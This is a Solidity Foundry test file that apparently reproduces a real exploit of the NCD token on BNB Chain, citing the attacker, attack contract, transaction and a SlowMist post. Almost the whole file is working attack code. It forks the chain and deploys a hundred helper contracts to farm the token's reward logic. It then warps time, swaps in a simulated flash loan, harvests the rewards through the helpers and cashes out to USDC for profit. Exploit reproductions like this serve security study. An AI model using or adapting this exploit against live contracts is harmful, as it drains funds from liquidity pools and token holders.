pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $6.4K
// Attacker : https://bscscan.com/address/0xd52f125085b70f7f52bd112500a9c334b7246984
// Attack Contract : https://bscscan.com/address/0xfad2a0642a44a68606c2295e69d383700643be68
// Attack Tx : https://bscscan.com/tx/0xbfb9b3b8a0d3c589a02f06c516b5c7b7569739edd00f9836645080f2148aefc7

// GUY : https://x.com/SlowMist_Team/status/1797821034319765604

interface INcd is IERC20{
    function mineStartTime(address) external view returns(uint256);
}

contract LetTheContractHaveRewards{
    IUniswapV2Pair private constant ncd_usdc_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);
    INcd ncd_ = INcd(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);


    function preStartTimeRewards() public /*onlyOwner*/{
        ncd_usdc_pair_.skim(address(this));
        ncd_.transfer(address(ncd_usdc_pair_), ncd_.balanceOf(address(this)) * 5 / 100);
        ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
        require(ncd_.mineStartTime(address(this)) > 0);
    }

    function ack() public /*onlyOwner*/{
        //first, to get a reward
        ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
        //seconds, to reward get msg.sender
        ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));

    }
}

contract LetTheContractHaveUsdc is Test{
    IERC20 ncd_ = IERC20(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
    IERC20 usdc_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Pair private constant ncd_usdc_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);
    function withdraw() public {
        usdc_.approve(address(router), type(uint256).max);
        ncd_.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(ncd_);
        path[1] = address(usdc_);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
           ncd_.balanceOf(address(this)) * 5 / 100 , 0, path, address(this), type(uint256).max
        );

        ncd_.transfer(msg.sender, ncd_.balanceOf(address(this)));
        usdc_.transfer(msg.sender, usdc_.balanceOf(address(this)));
    }
}
contract EuroExploit is Test {
    IERC20 ncd_ = IERC20(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
    IERC20 usdc_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Pair private constant ncd_usdc_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);

    LetTheContractHaveRewards[] letTheContractHaveRewardss;
    function setUp() public {
        vm.createSelectFork("bsc", 39253639);
        usdc_.approve(address(router), type(uint256).max);
        ncd_.approve(address(router), type(uint256).max);

        
    }

    function testExploit() public {
        
        deal(address(usdc_), address(this), 10 ether); //Assume this is an exchange for uniswap, not flashloan!
        emit log_named_decimal_uint("ack before usdc_ balance = ", usdc_.balanceOf(address(this)), usdc_.decimals());
        address[] memory path = new address[](2);
        path[0] = address(usdc_);
        path[1] = address(ncd_);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            10 ether, 0, path, address(this), type(uint256).max
        );
        ncd_.transfer(address(ncd_usdc_pair_), ncd_.balanceOf(address(this)) * 5 / 100);
        
        for(uint256 i = 0; i < 100; i++){
            LetTheContractHaveRewards letTheContractHaveRewards = new LetTheContractHaveRewards();
            letTheContractHaveRewards.preStartTimeRewards();
            letTheContractHaveRewardss.push(letTheContractHaveRewards);
        }

        vm.warp(block.timestamp + 1 days);

        deal(address(usdc_), address(this), 10000 ether); //flashloan 10000 usdc
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
           10000 ether , 0, path, address(this), type(uint256).max
        );
        for(uint256 i = 0; i < letTheContractHaveRewardss.length; i++){
            LetTheContractHaveRewards letTheContractHaveRewards = letTheContractHaveRewardss[i];
            ncd_.transfer(address(letTheContractHaveRewards), ncd_.balanceOf(address(this)));
            letTheContractHaveRewards.ack();
        }
        while(ncd_.balanceOf(address(this)) > 1000 ether){
        // for(uint256 i = 0; i < 100; i++){
            LetTheContractHaveUsdc letTheContractHaveUsdc = new LetTheContractHaveUsdc();
            ncd_.transfer(address(letTheContractHaveUsdc), ncd_.balanceOf(address(this)));
            letTheContractHaveUsdc.withdraw();
        }
                
        usdc_.transfer(address(0xdead), 10030 ether);// repay flashLoan
        emit log_named_decimal_uint("profit usdc_ balance = ", usdc_.balanceOf(address(this)), usdc_.decimals());
    }
}

